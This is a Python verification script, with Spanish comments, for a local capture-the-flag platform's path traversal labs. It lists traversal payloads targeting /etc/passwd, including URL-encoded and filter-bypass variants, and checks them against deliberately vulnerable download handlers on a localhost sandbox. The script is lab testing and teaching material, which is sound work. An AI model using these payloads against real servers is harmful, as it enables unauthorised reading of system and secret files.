#!/usr/bin/env python3
"""Verificación Bloque 3 — sandbox Path Traversal (labs 01 y 02)."""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from solve_ctf_auth import asegurar_sesion

from app.ctf_pathtraversal.lab_db import (
    inicializar_lab_pathtraversal,
    resolver_descarga_vulnerable,
    resolver_descarga_vulnerable_filtro_02,
    valor_file_crudo_en_query,
)

PAYLOADS_LAB01 = [
    "../../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://127.0.0.1:5000")
    p.add_argument(
        "--sin-http",
        action="store_true",
        help="Solo comprobaciones en lab_db (sin sesión portal ni /register).",
    )
    args = p.parse_args()
    base = args.base.rstrip("/")
    inicializar_lab_pathtraversal()

    print("=== Lab 01 — unitario (resolve + relative_to) ===")
    for pl in PAYLOADS_LAB01:
        ruta, err = resolver_descarga_vulnerable(pl)
        print(f"  {pl!r:45} -> {'OK file' if ruta else err or 'None'}")

    ok_in, _ = resolver_descarga_vulnerable("../archivos_secretos/flag.txt")
    print(f"\n  Legítimo ../archivos_secretos/flag.txt -> {'OK' if ok_in else 'FAIL'}")

    print("\n=== Lab 02 — filtro + sandbox (unitario) ===")
    literal = "../../../archivos_secretos/flag_02.txt"
    crudo = "../../../archivos_secretos/flag_02.txt"
    _, _, st = resolver_descarga_vulnerable_filtro_02(literal, crudo)
    print(f"  Literal ../ -> status_filtro={st}")

    enc = "..%2farchivos_secretos%2fflag_02.txt"
    ruta, err, st2 = resolver_descarga_vulnerable_filtro_02(
        "../archivos_secretos/flag_02.txt",
        enc,
    )
    print(f"  Encoding ..%2f -> filtro={st2}, ruta={'OK' if ruta else err}")

    if args.sin_http:
        print("\n[OK] verify_pt_sandbox — unitario (HTTP omitido con --sin-http)")
        return 0

    print("\n=== Lab 01/02 — HTTP (requiere sesión portal) ===")
    try:
        s = asegurar_sesion(base)
    except RuntimeError as exc:
        print(f"  [SKIP] {exc}")
        print("[OK] verify_pt_sandbox — unitario OK; HTTP omitido por sesión")
        return 0

    url01 = f"{base}/objetivos/pathtraversal/01/descargar?file="
    for pl in PAYLOADS_LAB01:
        r = s.get(url01 + pl, timeout=15)
        body = (r.text or "")[:80].replace("\n", " ")
        print(f"  HTTP {r.status_code}  {pl!r:40}  {body}")

    url02 = f"{base}/objetivos/pathtraversal/02/descargar?file="
    r = s.get(url02 + literal, timeout=15)
    print(f"  HTTP literal -> {r.status_code}")

    r = s.get(url02 + enc, timeout=15)
    print(f"  HTTP encoded -> {r.status_code}, flag={'yes' if 'flag{' in r.text else 'no'}")

    print("[OK] verify_pt_sandbox — unitario + HTTP")
    return 0


if __name__ == "__main__":
    sys.exit(main())
